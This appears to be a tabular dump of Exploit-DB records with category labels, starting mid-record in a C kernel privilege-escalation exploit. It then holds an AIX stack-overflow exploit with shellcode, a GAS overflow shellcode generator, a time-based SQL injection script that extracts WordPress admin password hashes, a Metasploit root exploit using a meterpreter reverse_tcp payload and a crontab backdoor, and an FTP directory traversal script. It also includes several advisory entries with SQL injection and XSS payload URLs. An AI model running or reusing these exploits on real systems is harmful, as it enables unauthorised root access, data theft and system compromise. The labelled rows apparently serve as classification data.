	}  //	we need to check the PROT_EXEC flag 	map_flags = PROT_EXEC; 	check_vma_flags(); 	if(!map_flags) { 		printf(""\n    VMAs reversed""); fflush(stdout); 	}  //	write protect brk's VMA to fool vm_enough_memory() 	r = sys_mprotect((lib_addr + PAGE_SIZE), LIB_SIZE-PAGE_SIZE, 			 PROT_READ|map_flags); 	if(-1==r) { fatal(""mprotect brk"", 0); }  //	this will finally make the big VMA... 	sz = (0-lib_addr) - LIB_SIZE - PAGE_SIZE; expand: 	r = sys_madvise((void*)(lib_addr + PAGE_SIZE), 			LIB_SIZE-PAGE_SIZE, MADV_NORMAL); 	if(r) fatal(""madvise"", 0); 	r = sys_mremap(lib_addr + LIB_SIZE-PAGE_SIZE, 			PAGE_SIZE, sz, MREMAP_MAYMOVE, 0); 	if(-1==r) { 		if(0==sz) { 			fatal(""mremap: expand VMA"", 0); 		} else { 			sz -= PAGE_SIZE; 			goto expand; 		} 	} 	vma_start = lib_addr + PAGE_SIZE; 	vma_end = vma_start + sz + 2*PAGE_SIZE; 	printf(""\n    expanded VMA (0x%.8x-0x%.8x)"", vma_start, vma_end); 	fflush(stdout);  //	try to figure kernel layout 	signal(SIGCHLD, reaper); 	signal(SIGSEGV, segvcnt); 	signal(SIGBUS, segvcnt); 	scan_mm_start();  failed: 	printf(""failed:\n""); 	fatal(""try again"", 0);  }   //	make fake ELF library void make_lib() { struct elfhdr eh; struct elf_phdr eph; static char tmpbuf[PAGE_SIZE]; int fd;  //	make our elf library 	umask(022); 	unlink(libname); 	fd=open(libname, O_RDWR|O_CREAT|O_TRUNC, 0755); 	if(fd<0) fatal(""open lib (""LIBNAME"" not writable?)"", 0); 	memset(&eh, 0, sizeof(eh) );  //	elf exec header 	memcpy(eh.e_ident, ELFMAG, SELFMAG); 	eh.e_type = ET_EXEC; 	eh.e_machine = EM_386; 	eh.e_phentsize = sizeof(struct elf_phdr); 	eh.e_phnum = 1; 	eh.e_phoff = sizeof(eh); 	write(fd, &eh, sizeof(eh) );  //	section header: 	memset(&eph, 0, sizeof(eph) ); 	eph.p_type = PT_LOAD; 	eph.p_offset = 4096; 	eph.p_filesz = 4096; 	eph.p_vaddr = lib_addr; 	eph.p_memsz = LIB_SIZE; 	eph.p_flags = PF_W|PF_R|PF_X; 	write(fd, &eph, sizeof(eph) );  //	execable code 	lseek(fd, 4096, SEEK_SET); 	memset(tmpbuf, 0x90, sizeof(tmpbuf) ); 	write(fd, &tmpbuf, sizeof(tmpbuf) ); 	close(fd); }   //	move stack down #2 void prepare_finish() { int r; static struct sysinfo si;  	old_esp &= ~(PAGE_SIZE-1); 	old_esp -= PAGE_SIZE; 	task_size = ((unsigned)old_esp + 1 GB ) / (1 GB) * 1 GB; 	r = sys_munmap(old_esp, task_size-old_esp); 	if(r) fatal(""unmap stack"", 0);  //	setup rt env 	uid = getuid(); 	lib_addr = task_size - LIB_SIZE - PAGE_SIZE; 	if(map_base) 		map_addr = map_base; 	else 		map_base = map_addr = (lib_addr - PGD_SIZE) & ~(PGD_SIZE-1); 	printf(""\n[+] moved stack %x, task_size=0x%.8x, map_base=0x%.8x"", 		old_esp, task_size, map_base); fflush(stdout);  //	check physical mem & prepare 	sysinfo(&si); 	addr_min = task_size + si.totalram; 	addr_min = (addr_min + PGD_SIZE - 1) & ~(PGD_SIZE-1); 	addr_max = addr_min + si.totalram; 	if((unsigned)addr_max >= 0xffffe000 || (unsigned)addr_max < (unsigned)addr_min) 		addr_max = 0xffffd000;  	printf(""\n[+] vmalloc area 0x%.8x - 0x%.8x"", addr_min, addr_max); 	max_page = (addr_max - addr_min) / PAGE_SIZE; 	pagemap = malloc( max_page + 32 ); 	if(!pagemap) fatal(""malloc pagemap"", 1); 	memset(pagemap, 0, max_page + 32);  //	go go 	make_lib(); 	exploitme(); }   //	move stack down #1 void prepare() { unsigned p=0;  	environ = myenv;  	p = sys_mmap2( 0, STACK_SIZE, PROT_READ|PROT_WRITE, 		       MAP_PRIVATE|MAP_ANONYMOUS, 0, 0	); 	if(-1==p) fatal(""mmap2 stack"", 0); 	p += STACK_SIZE - 64;  	__asm__(""movl	%%esp, %0	\n"" 		""movl 	%1, %%esp	\n"" 		: : ""m""(old_esp), ""m""(p) 	);  	prepare_finish(); }   void chldcnt(int v) { 	ccnt++; }   //	alloc slab objects... inline void do_wipe() { int *r, c=0, left=0;  	__asm__(""movl	%%esp, %0"" : : ""m""(old_esp) );  	old_esp = (old_esp - PGD_SIZE+1) & ~(PGD_SIZE-1); 	old_esp = map_base? map_base : old_esp;  	for(;;) { 		if(left<=0) 			left = get_slab_objs(""vm_area_struct""); 		if(left <= SLAB_THRSH) 			break; 		left--;  		map_flags ^= PROT_READ; 		old_esp -= PAGE_SIZE; 		r = (void*)sys_mmap2(old_esp, PAGE_SIZE, map_flags, 			MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, 0, 0 ); 		if(MAP_FAILED == r) 			break;  		if(c>SLAB_PER_CHLD) 			break; 		if( (c%1024)==0 ) { 			if(!c) printf(""\n""); 			printf(""\r    child %d VMAs %d"", val, c); 			fflush(stdout); 		} 		c++; 	} 	printf(""\r    child %d VMAs %d"", val, c); 	fflush(stdout); 	kill(getppid(), SIGUSR1); 	for(;;) pause(); }   //	empty SLAB caches void wipe_slab() { 	signal(SIGUSR1, chldcnt); 	printf(""\n[+] SLAB cleanup""); fflush(stdout); 	for(;;) { 		ccnt=0; 		val++; 		cpid = fork(); 		if(!cpid) 			do_wipe();  		while(!ccnt) sys_sched_yield(); 		if( get_slab_objs(""vm_area_struct"") <= SLAB_THRSH ) 			break; 	} 	signal(SIGUSR1, SIG_DFL); }   void usage(char *n) { 	printf(""\nUsage: %s\t-f forced stop\n"", n); 	printf(""\t\t-s silent mode\n""); 	printf(""\t\t-c command to run\n""); 	printf(""\t\t-n SMP iterations\n""); 	printf(""\t\t-d race delta us\n""); 	printf(""\t\t-w wait time seconds\n""); 	printf(""\t\t-l alternate lib name\n""); 	printf(""\t\t-a alternate addr hex\n""); 	printf(""\n""); 	_exit(1); }   //	give -s for forced stop, -b to clean SLAB int main(int ac, char **av) { int r;  	while(ac) { 		r = getopt(ac, av, ""n:l:a:w:c:d:fsh""); 		if(r<0) break;  		switch(r) {  		case 'f' : 			fstop = 1; 			break;  		case 's' : 			silent = 1; 			break;  		case 'n' : 			smp_max = atoi(optarg); 			break;  		case 'd': 			if(1!=sscanf(optarg, ""%u"", &delta_max) || delta_max > 100000u ) 				fatal(""bad delta value"", 0); 			break;  		case 'w' : 			wtime = atoi(optarg); 			if(wtime<0) fatal(""bad wait value"", 0); 			break;  		case 'l' : 			libname = strdup(optarg); 			break;  		case 'c' : 			shellname = strdup(optarg); 			break;  		case 'a' : 			if(1!=sscanf(optarg, ""%x"", &map_base)) 				fatal(""bad addr value"", 0); 			map_base &= ~(PGD_SIZE-1); 			break;  		case 'h' : 		default: 			usage(av[0]); 			break; 		} 	} 	consume_pid = fork(); 	 	if (consume_pid == 0) 	{ 		consume_memory(); 		pause(); 		return 0; 	} //	basic setup 	uid = getuid(); 	setpgrp(); 	wipe_slab(); 	prepare();  return 0; }  // milw0rm.com [2005-01-27]",Local Privilege Escalation,1
12006,Simple Calculator by Peter Rekdal Sunde - Arbitrary File Upload ========================================================================================                   | # Title    : Simple Calculator by Peter Rekdal Sunde Remote Upload Vulnerability            | # Author   : indoushka       | # Home     : www.dz-blackhat.com | # Tested on: Lunix Français v.(9.4 Ubuntu)        | # Bug      : Remote Upload                                                              ======================      Exploit By indoushka       =================================  # Exploit  :         1- http://127.0.0.1/upload/index.upload.php (index page)            2- http://127.0.0.1/upload/upload.php (Upload Page)            3- http://127.0.0.1/upload/ch99.php                      Dz-Ghost Team ===== Saoucha * Star08 * Redda * Silitoad * XproratiX * onurozkan * n2n * ======================== Greetz :  Exploit-db Team :  (loneferret+Exploits+dookie2000ca) all my friend : His0k4 * Hussin-X * Rafik (www.Tinjah.com) * Yashar (www.sc0rpion.ir) SoldierOfAllah (www.m4r0c-s3curity.cc) www.owned-m.com * Stake (www.v4-team.com) * r1z (www.sec-r1z.com) * D4NB4R http://www.ilegalintrusion.net/foro/ www.securityreason.com * www.m-y.cc * Cyb3r IntRue (avengers team) * www.alkrsan.net * www.mormoroth.net --------------------------------------------------------------------------------------------------------------,Arbitrary File Upload,1
35111,"slickMsg - Cross-Site Scripting / HTML Injection source: https://www.securityfocus.com/bid/45403/info  slickMsg is prone to a cross-site scripting vulnerability and multiple HTML-injection vulnerabilities because it fails to properly sanitize user-supplied input before using it in dynamically generated content.  Successful exploits will allow attacker-supplied HTML and script code to run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user. Other attacks are also possible.  slickMsg 0.7-alpha is vulnerable; other versions may also be affected.   XSS example 1: [size=expression(alert(123))]size[/size] XSS example 2: [color=expression(alert(456))]blue[/color] http://www.example.com/vulns/161/exploit.html",Cross-Site Scripting,1
48009,ELAN Smart-Pad 11.10.15.1 - 'ETDService' Unquoted Service Path #Exploit Title: ELAN Smart-Pad 11.10.15.1 - 'ETDService' Unquoted Service Path #Exploit Author : ZwX #Exploit Date: 2020-02-05 #Vendor : ELAN Microelectronics #Vendor Homepage : http://www.emc.com.tw/ #Tested on OS: Windows 10 v1803   #Analyze PoC : ==============   C:\Users\ZwX>sc qc ETDService [SC] QueryServiceConfig réussite(s)  SERVICE_NAME: ETDService         TYPE               : 10  WIN32_OWN_PROCESS         START_TYPE         : 2   AUTO_START         ERROR_CONTROL      : 1   NORMAL         BINARY_PATH_NAME   : C:\Program Files\Elantech\ETDService.exe         LOAD_ORDER_GROUP   :         TAG                : 0         DISPLAY_NAME       : Elan Service         DEPENDENCIES       :         SERVICE_START_NAME : LocalSystem,Unquoted Service Path,1
33084,Oracle 9i/10g Database - Network Foundation Remote Overflow source: https://www.securityfocus.com/bid/35684/info  Oracle Database is prone to a remote vulnerability in Network Foundation.  The vulnerability can be exploited over the 'Oracle Net' protocol. An attacker doesn't require privileges to exploit this vulnerability.  The following supported versions are affected:  9.2.0.8 9.2.0.8DV 10.1.0.5 10.2.0.4 11.1.0.7   https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/33084.zip,Network Foundation Remote Overflow,1
22864,ProductCart 1.5/1.6/2.0 - 'Custva.asp' SQL Injection source: https://www.securityfocus.com/bid/8103/info  ProductCart has been reported prone to an SQL injection vulnerability that may be exploited to reveal information relating to the underlying database; other attacks may also be possible.  http://www.example.com/productcart/pc/Custva.asp?redirectUrl=&Email=%27+having+1 %3D1--&_email=email&password=asd&_password=required&Submit.x=33&Submit.y=5&Submit=Submit,SQL Injection,1
38260,"Konica Minolta FTP Utility 1.0 - Directory Traversal /* --------------------------------------------------------------------- Konica Minolta FTP Utility directory traversal vulnerability Url: http://download.konicaminolta.hk/bt/driver/mfpu/ftpu/ftpu_10.zip  Author: shinnai mail: shinnai[at]autistici[dot]org site: http://www.shinnai.altervista.org/ Poc: http://shinnai.altervista.org/exploits/SH-0024-20150922.html --------------------------------------------------------------------- */  <?php    $local_file = 'boot.ini.txt';    $server_file = '..\..\..\..\..\..\..\..\boot.ini';     $conn_id = ftp_connect($ftp_server);    $login_result = ftp_login($conn_id, ""anonymous"", ""anonymous"");     if (ftp_get($conn_id, $local_file, $server_file, FTP_BINARY)) {      echo ""Successfully written to $local_file\n"";    } else {      echo ""There was a problem\n"";    }    ftp_close($conn_id); ?> ---------------------------------------------------------------------",Directory Traversal,1
28397,"GNU BinUtils 2.1x - GAS Buffer Overflow source: https://www.securityfocus.com/bid/19555/info  GNU binutils GAS (GNU assembler) is prone to a buffer-overflow vulnerability because it fails to properly bounds-check user-supplied input before copying it to an insufficiently sized memory buffer.  Remote attackers may crash the application or execute arbitrary machine code in the context of the application.  #!/bin/sh # # gas overflow poc, <taviso@gentoo.org>  returnaddr='\xc4\xea\xff\xbf' shellcode='\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff/bin/id'  printf '#include <stdio.h>\n' printf '#define EGG ""%s""\n' ""$shellcode"" printf '#define RET ""%s""\n' ""$returnaddr"" printf '#define NOP ""%s""\n' ""`perl -e 'print ""\\\x90""x100'`"" printf '#define PAD ""%s""\n' ""`perl -e 'print ""A""x1990'`""  cat << __EOF__ #include <stdio.h>  int main (int argc, char **argv) { 	        __asm__ (PAD RET NOP EGG); } __EOF__",GAS Buffer Overflow,1
45915,"Linux - Nested User Namespace idmap Limit Local Privilege Escalation (Metasploit) ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  class MetasploitModule < Msf::Exploit::Local   Rank = GreatRanking    include Msf::Post::Linux::Priv   include Msf::Post::Linux::System   include Msf::Post::Linux::Kernel   include Msf::Post::File   include Msf::Exploit::EXE   include Msf::Exploit::FileDropper    def initialize(info = {})     super(update_info(info,       'Name'           => 'Linux Nested User Namespace idmap Limit Local Privilege Escalation',       'Description'    => %q{         This module exploits a vulnerability in Linux kernels 4.15.0 to 4.18.18,         and 4.19.0 to 4.19.1, where broken uid/gid mappings between nested user         namespaces and kernel uid/gid mappings allow elevation to root         (CVE-2018-18955).          The target system must have unprivileged user namespaces enabled and         the newuidmap and newgidmap helpers installed (from uidmap package).          This module has been tested successfully on:          Fedora Workstation 28 kernel 4.16.3-301.fc28.x86_64;         Kubuntu 18.04 LTS kernel 4.15.0-20-generic (x86_64);         Linux Mint 19 kernel 4.15.0-20-generic (x86_64);         Ubuntu Linux 18.04.1 LTS kernel 4.15.0-20-generic (x86_64).       },       'License'        => MSF_LICENSE,       'Author'         =>         [           'Jann Horn', # Discovery and exploit           'bcoles'     # Metasploit         ],       'DisclosureDate' => 'Nov 15 2018',       'Platform'       => ['linux'],       'Arch'           => [ARCH_X86, ARCH_X64],       'SessionTypes'   => ['shell', 'meterpreter'],       'Targets'        => [['Auto', {}]],       'Privileged'     => true,       'References'     =>         [           ['BID', '105941'],           ['CVE', '2018-18955'],           ['EDB', '45886'],           ['PACKETSTORM', '150381'],           ['URL', 'https://bugs.chromium.org/p/project-zero/issues/detail?id=1712'],           ['URL', 'https://github.com/bcoles/kernel-exploits/tree/master/CVE-2018-18955'],           ['URL', 'https://lwn.net/Articles/532593/'],           ['URL', 'https://bugs.launchpad.net/bugs/1801924'],           ['URL', 'https://people.canonical.com/~ubuntu-security/cve/CVE-2018-18955'],           ['URL', 'https://security-tracker.debian.org/tracker/CVE-2018-18955'],           ['URL', 'https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd'],           ['URL', 'https://cdn.kernel.org/pub/linux/kernel/v4.x/ChangeLog-4.18.19'],           ['URL', 'https://cdn.kernel.org/pub/linux/kernel/v4.x/ChangeLog-4.19.2']         ],       'DefaultTarget'  => 0,       'DefaultOptions' =>         {           'AppendExit'       => true,           'PrependSetresuid' => true,           'PrependSetreuid'  => true,           'PrependSetuid'    => true,           'PrependFork'      => true,           'WfsDelay'         => 60,           'PAYLOAD'          => 'linux/x86/meterpreter/reverse_tcp'         },       'Notes' =>         {           'AKA' => ['subuid_shell.c']         }       ))     register_options [       OptEnum.new('COMPILE', [true, 'Compile on target', 'Auto', %w[Auto True False]])     ]     register_advanced_options [       OptBool.new('ForceExploit',  [false, 'Override check result', false]),       OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])     ]   end    def base_dir     datastore['WritableDir'].to_s   end    def upload(path, data)     print_status ""Writing '#{path}' (#{data.size} bytes) ...""     rm_f path     write_file path, data     register_file_for_cleanup path   end    def upload_and_chmodx(path, data)     upload path, data     chmod path   end    def upload_and_compile(path, data)     upload ""#{path}.c"", data      gcc_cmd = ""gcc -o #{path} #{path}.c""     if session.type.eql? 'shell'       gcc_cmd = ""PATH=$PATH:/usr/bin/ #{gcc_cmd}""     end     output = cmd_exec gcc_cmd      unless output.blank?       print_error output       fail_with Failure::Unknown, ""#{path}.c failed to compile. Set COMPILE False to upload a pre-compiled executable.""     end      register_file_for_cleanup path     chmod path, 0755   end    def exploit_data(file)     ::File.binread ::File.join(Msf::Config.data_directory, 'exploits', 'cve-2018-18955', file)   end    def live_compile?     return false unless datastore['COMPILE'].eql?('Auto') || datastore['COMPILE'].eql?('True')      if has_gcc?       vprint_good 'gcc is installed'       return true     end      unless datastore['COMPILE'].eql? 'Auto'       fail_with Failure::BadConfig, 'gcc is not installed. Compiling will fail.'     end   end    def check     unless userns_enabled?       vprint_error 'Unprivileged user namespaces are not permitted'       return CheckCode::Safe     end     vprint_good 'Unprivileged user namespaces are permitted'      ['/usr/bin/newuidmap', '/usr/bin/newgidmap'].each do |path|       unless setuid? path         vprint_error ""#{path} is not set-uid""         return CheckCode::Safe       end       vprint_good ""#{path} is set-uid""     end      # Patched in 4.18.19 and 4.19.2     release = kernel_release     v = Gem::Version.new release.split('-').first     if v < Gem::Version.new('4.15') ||        v >= Gem::Version.new('4.19.2') ||        (v >= Gem::Version.new('4.18.19') && v < Gem::Version.new('4.19'))       vprint_error ""Kernel version #{release} is not vulnerable""       return CheckCode::Safe     end     vprint_good ""Kernel version #{release} appears to be vulnerable""      CheckCode::Appears   end    def on_new_session(session)     if session.type.to_s.eql? 'meterpreter'       session.core.use 'stdapi' unless session.ext.aliases.include? 'stdapi'       session.sys.process.execute '/bin/sh', ""-c \""/bin/sed -i '\$ d' /etc/crontab\""""     else       session.shell_command(""/bin/sed -i '\$ d' /etc/crontab"")     end   ensure     super   end    def exploit     unless check == CheckCode::Appears       unless datastore['ForceExploit']         fail_with Failure::NotVulnerable, 'Target is not vulnerable. Set ForceExploit to override.'       end       print_warning 'Target does not appear to be vulnerable'     end      if is_root?       unless datastore['ForceExploit']         fail_with Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.'       end     end      unless writable? base_dir       fail_with Failure::BadConfig, ""#{base_dir} is not writable""     end      # Upload executables     subuid_shell_name = "".#{rand_text_alphanumeric 5..10}""     subuid_shell_path = ""#{base_dir}/#{subuid_shell_name}""     subshell_name = "".#{rand_text_alphanumeric 5..10}""     subshell_path = ""#{base_dir}/#{subshell_name}""     if live_compile?       vprint_status 'Live compiling exploit on system...'       upload_and_compile subuid_shell_path, exploit_data('subuid_shell.c')       upload_and_compile subshell_path, exploit_data('subshell.c')     else       vprint_status 'Dropping pre-compiled exploit on system...'       upload_and_chmodx subuid_shell_path, exploit_data('subuid_shell.out')       upload_and_chmodx subshell_path, exploit_data('subshell.out')     end      # Upload payload executable     payload_path = ""#{base_dir}/.#{rand_text_alphanumeric 5..10}""     upload_and_chmodx payload_path, generate_payload_exe      # Launch exploit     print_status 'Adding cron job...'     output = cmd_exec ""echo \""echo '* * * * * root #{payload_path}' >> /etc/crontab\"" | #{subuid_shell_path} #{subshell_path} ""     output.each_line { |line| vprint_status line.chomp }      crontab = read_file '/etc/crontab'     unless crontab.include? payload_path       fail_with Failure::Unknown, 'Failed to add cronjob'     end      print_good 'Success. Waiting for job to run (may take a minute)...'   end end",Limit Local Privilege Escalation',1
42103,"WebKit JSC - 'JSObject::ensureLength' ensureLengthSlow Check Failure /* Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1165  Here's a snippet of JSObject::ensureLength.  bool WARN_UNUSED_RETURN ensureLength(VM& vm, unsigned length) {     ASSERT(length < MAX_ARRAY_INDEX);     ASSERT(hasContiguous(indexingType()) || hasInt32(indexingType()) || hasDouble(indexingType()) || hasUndecided(indexingType()));      bool result = true;     if (m_butterfly.get()->vectorLength() < length)         result = ensureLengthSlow(vm, length);              if (m_butterfly.get()->publicLength() < length)         m_butterfly.get()->setPublicLength(length);     return result; }  |setPublicLength| is called whether |ensureLengthSlow| failed or not. So the |publicLength| may be lager than the actual allocated memory's size, which results in an OOB access.  Tested on Linux.  PoC: */  const kArrayLength = 0x200000;  let arr = new Array(kArrayLength); arr.fill({});  let exh = []; try {     for (;;) {         exh.push(new ArrayBuffer(kArrayLength * 8 * 8));     } } catch (e) { }  try {     arr.length *= 8;     print('failed'); } catch (e) {     print(e);      exh = null;      print('arr length: ' + arr.length.toString(16));     for (let i = kArrayLength, n = arr.length; i < n; i++) {         if (arr[i])             print(arr[i]);     } }",Check Failure,1
32396,Parallels H-Sphere 3.0/3.1 - 'login.php' Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/31256/info  H-Sphere is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.  H-Sphere 3.0.0 Patch 9 and 3.1 Patch 1 are vulnerable; other versions may also be affected.   http://www.example.com/webshell4/login.php?err=[XSS] http://www.example.com/webshell4/login.php?login=[XSS],multiple cross-site scripting,1
46958,"WordPress Plugin Form Maker 1.13.3 - SQL Injection # -*- coding: utf-8 -*- # Exploit Title: WordPress Plugin Form Maker 1.13.3 - SQL Injection # Date: 22-03-2019 # Exploit Author: Daniele Scanu @ Certimeter Group # Vendor Homepage: https://10web.io/plugins/ # Software Link: https://wordpress.org/plugins/form-maker/ # Version: 1.13.3 # Tested on: Ubuntu 18.04 # CVE : CVE-2019-10866  import requests import time  url_vuln = 'http://localhost/wordpress/wp-admin/admin.php?page=submissions_fm&task=display&current_id=2&order_by=group_id&asc_or_desc=' session = requests.Session() dictionary = '@._-$/\\""£%&;§+*1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM' flag = True username = ""username"" password = ""password"" temp_password = """" TIME = 0.5  def login(username, password):     payload = {         'log': username,         'pwd': password,         'wp-submit': 'Login',         'redirect_to': 'http://localhost/wordpress/wp-admin/',         'testcookie': 1     }     session.post('http://localhost/wordpress/wp-login.php', data=payload)  def print_string(str):     print ""\033c""     print str  def get_admin_pass():     len_pwd = 1     global flag     global temp_password     while flag:         flag = False         ch_temp = ''         for ch in dictionary:             print_string(""[*] Password dump: "" + temp_password + ch)             ch_temp = ch             start_time = time.time()             r = session.get(url_vuln + ',(case+when+(select+ascii(substring(user_pass,' + str(len_pwd) + ',' + str(len_pwd) + '))+from+wp_users+where+id%3d1)%3d' + str(ord(ch)) + '+then+(select+sleep(' + str(TIME) + ')+from+wp_users+limit+1)+else+2+end)+asc%3b')             elapsed_time = time.time() - start_time             if elapsed_time >= TIME:                 flag = True                 break         if flag:             temp_password += ch_temp             len_pwd += 1  login(username, password) get_admin_pass() print_string(""[+] Password found: "" + temp_password)",SQL Injection,1
699,"AIX 5.1 < 5.3 - paginit Local Stack Overflow /* exploit for /usr/bin/paginit    tested on: AIX 5.2     if the exploit fails it's because the shellcode    ends up at a different address. use dbx to check,    and change RETADDR accordingly.     cees-bart <ceesb cs ru nl> */  #define RETADDR 0x2ff22c90  char shellcode[] = ""\x7c\xa5\x2a\x79"" ""\x40\x82\xff\xfd""       ""\x7c\xa8\x02\xa6""       ""\x38\xe0\x11\x11"" ""\x39\x20\x48\x11""       ""\x7c\xc7\x48\x10""       ""\x38\x46\xc9\x05""       ""\x39\x25\x11\x11"" ""\x38\x69\xef\x17""       ""\x38\x87\xee\xef""       ""\x7c\xc9\x03\xa6""       ""\x4e\x80\x04\x20"" ""\x2f\x62\x69\x6e""       ""\x2f\x73\x68\x00"" ;  char envlabel[] = ""X="";  void printint(char* buf, int x) {   buf[0] = x >> 24;   buf[1] = (x >> 16) & 0xff;   buf[2] = (x >> 8) & 0xff;   buf[3] = x & 0xff; }  int main(int argc, char **argv) {   char *env[3];   char code[1000];   char buf[8000];   char *p, *i;   int offset1 = 0;    offset1 = 0; // atoi(argv[1]);      memset(code, 'C', sizeof(code));   memcpy(code, envlabel,sizeof(envlabel)-1);   // landingzone    for(i=code+sizeof(envlabel)+offset1; i<code+sizeof(code); i+=4)      printint(i, 0x7ca52a79);    memcpy(code+sizeof(code)-sizeof(shellcode), shellcode, sizeof(shellcode)-1);     code[sizeof(code)-1] = 0;      env[0] = code;   env[1] = 0;    memset(buf, 'A', sizeof(buf));   buf[sizeof(buf)-1] = 0;       p = buf;   p += 4114;   printint(p,RETADDR); // try to hit the landingzone   p += 72;   printint(p, RETADDR); // any readable address (apparently not overwritten)    execle(""/usr/bin/paginit"", ""/usr/bin/paginit"", buf, 0, env); }  // milw0rm.com [2004-12-20]",paginit Local Stack Overflow,1
35959,"Joomla! Component com_hospital - SQL Injection source: https://www.securityfocus.com/bid/48689/info  The 'com_hospital' component for Joomla! is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.   http://www.example.com/index.php?option=com_hospital&view=departments&Itemid=21&did=[SQL INJECTION]",SQL Injection,1
36630,"Joomla! Component com_products - Multiple SQL Injections source: https://www.securityfocus.com/bid/51674/info  The 'com_products' component for Joomla! is prone to multiple SQL-injection vulnerabilities because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting these issues could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.   http://www.example.com/index.php?option=com_products&task=category&catid=[SQL Injection] http://www.example.com/index.php?option=com_products&id=[SQL Injection] http://www.example.com/index.php?option=com_products&catid=[SQL Injection] http://www.example.com/index.php?option=com_products&product_id=[SQL Injection] http://www.example.com/index.php?option=com_products&task=detail&parent_id=[SQL Injection] http://www.example.com/index.php?option=com_products&task=edit_productdetail&id_pro=[SQL Injection] http://www.example.com/index.php?option=com_products&Itemid=53&controller=home&task=displayitem&itemcode=[SQL Injection] http://www.example.com/index.php?option=com_products&catid=1&Cat[]=[SQL Injection] http://www.example.com/index.php?option=com_products&cid=[SQL Injection] http://www.example.com/index.php?option=com_products&view=products&id=19&cat=[SQL Injection] http://www.example.com/index.php?option=com_products&task=product&pid=[SQL Injection] http://www.example.com/index.php?option=com_products&Itemid=[SQL Injection]",SQL Injections,1
40031,"Symantec AntiVirus - Unpacking RAR Multiple Remote Memory Corruptions Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=810  A major component of the Symantec Antivirus scan engine is the ""Decomposer"", responsible for unpacking various archive formats such as ZIP, RAR, and so on. The decomposer runs as NT AUTHORITY\SYSTEM on Windows, and root on Linux and Mac. It is self-evident from looking at the decomposer code that Symantec have based the RAR decompression on the open-source unrar package from RAR labs (Note: this is permitted by the unrar license).  By comparing Symantec's code to the open source code, I have determined that Symantec are probably using version 4.1.4 of the unrar code, released in January 2012. The most current version is version 5.3.11.  Between the version of unrar that Symantec runs as NT AUTHORITY\SYSTEM to unpack untrusted binaries received over the network and the the current version, literally hundreds of critical memory corruption bugs have been resolved.  I have verified that multiple publicly known vulnerabilities affect Symantec, and can result in remote code execution as NT AUTHORTITY\SYSTEM on Windows and root on Linux and Mac.  I have verified this on the following products:      Norton Antivirus, Windows     Symantec Endpoint Protection, Linux and Windows     Symantec Scan Engine, Linux and Windows  Presumably this affects all other Symantec products using the core Symantec scan engine.  In my opinion, I'm being exceptionally generous considering this issue a new vulnerability and not public information. Frankly, it is astonishing that Symantec do not track new releases of third party code they use. I think you should take this opportunity to check all other third party code you're using to verify you haven't fallen behind.  I've attached a trivial example that modifies an arbitrary index in the PlaceA[] array via Unpack::ShortLZ().    (534.adc): Access violation - code c0000005 (!!! second chance !!!) eax=14858d00 ebx=07da63e0 ecx=07da65ec edx=fb6e43a0 esi=07da6370 edi=daf72217 eip=6d7b4016 esp=0da8d260 ebp=0da8d27c iopl=0         nv up ei ng nz na pe nc cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010286 ccScanw!filelengthi64+0x470b6: 6d7b4016 8994be005d0000  mov     dword ptr [esi+edi*4+5D00h],edx ds:002b:73b748cc=14858d00 0:052> lm v mccScanw start    end        module name 6d690000 6d8bf000   ccScanw    (export symbols)       C:\Program Files (x86)\Norton Security\Engine\22.6.0.142\ccScanw.dll     Loaded symbol image file: C:\Program Files (x86)\Norton Security\Engine\22.6.0.142\ccScanw.dll     Image path: C:\Program Files (x86)\Norton Security\Engine\22.6.0.142\ccScanw.dll     Image name: ccScanw.dll     Timestamp:        Tue Jan 26 13:51:55 2016 (56A7EA7B)     CheckSum:         0022B3ED     ImageSize:        0022F000     File version:     13.1.2.19     Product version:  13.1.2.19     File flags:       0 (Mask 3F)     File OS:          40004 NT Win32     File type:        1.0 App     File date:        00000000.00000000     Translations:     0409.04b0     CompanyName:      Symantec Corporation     ProductName:      Symantec Security Technologies     InternalName:     ccScan     OriginalFilename: CCSCAN.DLL     ProductVersion:   13.1.2.19     FileVersion:      13.1.2.19     FileDescription:  Symantec Scan Engine     LegalCopyright:   Copyright (c) 2015 Symantec Corporation. All rights reserved.  These bugs are obviously exploitable for remote code execution on all Symantec customer machines as root or SYSTEM.   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/40031.zip",Remote Memory Corruptions,1
